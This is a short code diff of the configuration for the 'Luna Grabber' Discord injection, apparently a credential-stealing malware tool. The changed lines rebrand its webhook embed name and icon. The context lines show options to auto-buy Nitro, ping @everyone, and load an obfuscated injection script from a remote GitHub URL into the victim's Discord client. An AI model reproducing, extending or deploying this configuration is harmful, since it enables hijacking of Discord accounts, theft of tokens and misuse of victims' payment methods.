@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', 
+  embed_name: 'Injection', 
+  embed_icon: 'https://discord.com/assets/999edf6459b7dacdcadf.png?size=1024&format=webp&quality=lossless&width=0&height=256', 
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js', 
 
